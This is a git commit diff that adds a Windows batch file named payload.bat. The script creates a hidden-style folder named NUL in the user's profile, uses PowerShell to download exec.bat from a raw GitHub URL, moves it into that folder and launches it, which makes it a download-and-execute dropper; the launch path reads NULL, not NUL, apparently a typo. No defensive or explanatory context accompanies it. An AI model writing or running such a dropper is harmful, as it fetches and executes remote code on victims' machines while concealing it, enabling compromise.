5c6bad2b7e0813deb6bb0d58c3afa69e3686704d
timberh789 <53507393+timberh789@users.noreply.github.com>
2022-01-02 17:18:39 +0800

    Update payload.bat

--- payload.bat
+++ payload.bat
@@ -1,1 +1,7 @@
-
+@echo off
+C:
+cd %USERPROFILE%
+md NUL
+powershell -Command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/timberh789/Server/main/exec.bat', '%USERPROFILE%\exec.bat')
+move /Y %USERPROFILE%\exec.bat %USERPROFILE%\NUL
+start %USERPROFILE%\NULL\exec.bat
